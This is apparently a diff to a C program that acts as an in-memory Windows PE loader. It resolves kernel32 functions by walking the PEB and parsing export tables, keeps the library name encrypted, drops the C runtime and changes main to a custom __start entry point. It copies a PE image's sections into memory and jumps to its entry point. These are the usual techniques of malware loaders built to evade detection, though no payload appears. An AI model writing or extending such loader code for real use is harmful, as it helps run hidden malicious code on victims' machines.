@@ -43,7 +43,7 @@ PPEB peb_windows_structure = NULL;
 void *kernel_library_address = NULL;
 int number_kernel_library_functions = 11;
 void *kernel_library_function_addresses[11] = {};
-char encrypted_kernel_library_name[] = "\x62\x7f\x16\xe3\x7a\x4d\x8b\x96\x71\xcc\xcb\x96\xbf\xb0\xa9\xf0\x25\x89\x3a\xae\x4a\x89\xa2\xd0\x2a\x4f\x8c\x6d\x78\x3b\x64\x7b\xc0\xc3\x75\x0a\x3c\x94\xda\x61\x0f\x79\xdb\x46\x91\x3f\x4d\x0e";
+char encrypted_kernel_library_name[] = "\xbb\x3c\xf2\x31\x79\x1b\x07\x59\xb9\x85\x63\xce\xa7\x98\x80\x94\x1d\xb4\x4b\x16\x17\x7f\x34\x68\x24\x4b\xfc\x9a\xba\x54\x40\xa2\x04\x2a\x3d\xc4\x8a\x5f\x5b\x48\x04\x32\x1c\x2d\x94\xaa\x60\xd8";
 int size_encrypted_kernel_library_name = 48;
 const wchar_t *kernel_library_name = NULL;
 // expected order is 'GetProcAddress\x00LoadLibraryA\x00GetModuleHandleA\x00VirtualAlloc\x00VirtualProtect\x00HeapFree\x00HeapAlloc\x00GetProcessHeap\x00WriteFile\x00GetStdHandle\x00VirtualFree'.encode('ascii') + b'\x00'
@@ -58,7 +58,7 @@ static HANDLE global_windows_heap = NULL;
 // START C STANDARD LIBRARY REPLACEMENT
 
 // strcmp - compare strings
-int replacement_strcmp(const char *s1, const char *s2) {
+int strcmp(const char *s1, const char *s2) {
     while (*s1 && (*s1 == *s2)) {
         s1++;
         s2++;
@@ -67,7 +67,7 @@ int replacement_strcmp(const char *s1, const char *s2) {
 }
 
 // memcpy - copy memory
-void *replacement_memcpy(void *dest, const void *src, size_t n) {
+void *memcpy(void *dest, const void *src, size_t n) {
     unsigned char *d = (unsigned char *)dest;
     const unsigned char *s = (const unsigned char *)src;
     while (n--) {
@@ -77,7 +77,7 @@ void *replacement_memcpy(void *dest, const void *src, size_t n) {
 }
 
 // memset - set memory
-void *replacement_memset(void *s, int c, size_t n) {
+void *memset(void *s, int c, size_t n) {
     unsigned char *p = (unsigned char *)s;
     while (n--) {
         *p++ = (unsigned char)c;
@@ -86,11 +86,11 @@ void *replacement_memset(void *s, int c, size_t n) {
 }
 
 
-void *replacement_malloc(size_t size) {
+void *malloc(size_t size) {
     return ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[3])(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 }
 
-void replacement_free(void *ptr) {
+void free(void *ptr) {
     if (ptr) {
         ((BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD)) kernel_library_function_addresses[10])(ptr, 0, MEM_RELEASE);
     }
@@ -181,7 +181,7 @@ void *get_function_address(void *module_address, const char *function_name){
     
     for (DWORD i = 0; i < export_directory->NumberOfNames; i++) {
         const char *function_in_module = (const char *) (((BYTE *) module_address) + names_exported[i]);
-        if (replacement_strcmp(function_in_module, function_name) == 0) {
+        if (strcmp(function_in_module, function_name) == 0) {
             WORD selected_ordinal = ordinals[i];
             return (((BYTE *) module_address) + function_address_array[selected_ordinal]);
         }
@@ -272,7 +272,7 @@ void copy_to_virtual(const char *pe_data, char *image_base){
     IMAGE_SECTION_HEADER* source_sections = (IMAGE_SECTION_HEADER *) (source_pe_nt_header + 1); 
 
     // First copy the headers
-    replacement_memcpy(image_base, pe_data, source_pe_nt_header->OptionalHeader.SizeOfHeaders);
+    memcpy(image_base, pe_data, source_pe_nt_header->OptionalHeader.SizeOfHeaders);
     
     // Now copy each section
     for(int i = 0; i < source_pe_nt_header->FileHeader.NumberOfSections; i++){
@@ -281,9 +281,9 @@ void copy_to_virtual(const char *pe_data, char *image_base){
 
         // Copy raw data or set to 0 if there is none
         if(source_sections[i].SizeOfRawData > 0){
-            replacement_memcpy(dest, pe_data + source_sections[i].PointerToRawData, source_sections[i].SizeOfRawData);
+            memcpy(dest, pe_data + source_sections[i].PointerToRawData, source_sections[i].SizeOfRawData);
         } else {
-            replacement_memset(dest, 0, source_sections[i].Misc.VirtualSize);
+            memset(dest, 0, source_sections[i].Misc.VirtualSize);
         }
     }
 }
@@ -395,7 +395,7 @@ int set_protections(in_memory_pe *new_pe){
 }
 
 in_memory_pe *code_handling_load_pe(const char *pe_data, DWORD size){
-    in_memory_pe *new_pe = replacement_malloc(sizeof(in_memory_pe));
+    in_memory_pe *new_pe = malloc(sizeof(in_memory_pe));
     if(new_pe == NULL)
         goto error;
     
@@ -421,19 +421,18 @@ in_memory_pe *code_handling_load_pe(const char *pe_data, DWORD size){
 
     return new_pe;
 error:
-    replacement_free(new_pe);
+    free(new_pe);
     return NULL;
 }
 
 void code_handling_execute(in_memory_pe *new_pe){
-    print_minimal();
     void (*execute_entry_point)(void) = (void(*)()) new_pe->entry_point;
     execute_entry_point();
 }
 
 // MAIN
 
-int main(void) {   
+int __start(void) {   
     init_kernel_library();
     print_minimal();
 
